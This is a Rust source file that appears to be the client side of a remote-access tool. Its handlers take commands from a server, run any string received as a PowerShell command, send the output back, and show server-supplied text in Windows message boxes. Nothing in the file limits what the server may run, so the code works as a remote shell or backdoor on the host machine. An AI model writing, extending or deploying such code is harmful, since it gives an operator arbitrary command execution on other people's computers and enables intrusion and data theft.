extern crate winapi;
extern crate user32;

use std::ffi::{CString};
use std::fmt::format;
use user32::MessageBoxA;
use winapi::um::winuser::{MB_OK, MB_ICONINFORMATION};
use std::process;
use std::process::Stdio;
use lib::{Command, CommandErr, send_data};
use crate::Client;
use serde::{Deserialize, Serialize};


/// Parses the byte buffer into a String then runs the given command
pub fn parse_message(client: &mut Client, command: Command, buf: Vec<u8>) {
    // TODO: remove unwrap
    let message = serde_json::from_slice(&buf).unwrap();
    
    match command {
        Command::Run => run(client, message),
        Command::Echo => echo(client, message),
        Command::Message => display_message(client, message),
        Command::Send => receive(client, message),
    }
}

pub fn receive(client: &mut Client, message: String) {
    log::trace!("Message received from server: {}", message);
    send_data(Command::Send, &(), &mut client.writer).unwrap()
}

pub fn run(client: &mut Client, command: String) {
    let output = process::Command::new("powershell")
        .args(["-Command", &command])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    let response = match output {
        Ok(output) => {
            if output.status.success() {
                log::trace!("Command: {}. Successful command run {}", command, String::from_utf8_lossy(&output.stdout).to_string());
                format!("Command executed successfully.\nResponse:\n{}", String::from_utf8(output.stdout).unwrap())
            } else {
                log::trace!("Command: {}. Unsuccessful command run {}", command, String::from_utf8_lossy(&output.stdout).to_string());
                format!("Command return an error. Error message:\n{}", String::from_utf8(output.stderr).unwrap())
            }
        },
        Err(err) => format!("An error occurred while running command: {}", err),
    };
    
    send_data(Command::Send, &response, &mut client.writer).unwrap()
}

pub fn echo(client: &mut Client, message: String) {
    log::debug!("Received message: {}", message);
    if send_data(Command::Send, &message, &mut client.writer).is_ok() {
        log::info!("Successfully echoed data back to server");
    }
    else {
        log::error!("An error occurred while echoing data to server");
    }
}

pub fn display_message(client: &mut Client, message: String) {
    let message = CString::new(message).unwrap();
    let title = CString::new("Message").unwrap();

    unsafe {
        MessageBoxA(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONINFORMATION
        );
    }
    send_data(Command::Send, &(), &mut client.writer).unwrap();
}

pub fn message_box(title: &str, message: &str, icon_info: u32) {
    let message = CString::new(message).unwrap();
    let title = CString::new(title).unwrap();

    unsafe {
        MessageBoxA(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            icon_info
        );
    }
}


#[cfg(test)]
mod tests {
    #[test]
    fn test_message_box() {
        crate::tools::message_box("Title", "Message", winapi::um::winuser::MB_OK);
    }
}